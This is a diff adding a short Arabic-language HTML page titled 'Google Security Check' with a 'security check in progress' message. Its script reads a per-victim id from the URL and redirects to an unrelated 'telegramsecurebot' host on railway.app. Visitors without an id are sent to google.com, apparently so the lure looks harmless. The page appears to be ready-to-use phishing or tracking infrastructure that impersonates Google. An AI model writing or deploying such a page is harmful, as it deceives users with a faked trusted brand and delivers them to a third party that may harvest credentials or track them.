@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Google Security Check</title>
+</head>
+<body>
+    <p>يرجى الانتظار... جارِ التحقق الأمني.</p>
+    <script>
+        // ياخذ كل الاستفسارات من الرابط (مثلا: ?id=UUID)
+        let url = new URL(window.location.href);
+        let uuid = url.searchParams.get("id");
+        if(uuid){
+            window.location.href = "https://telegramsecurebot-production.up.railway.app/redirect/" + uuid;
+        }else{
+            window.location.href = "https://google.com";
+        }
+    </script>
+</body>
+</html>
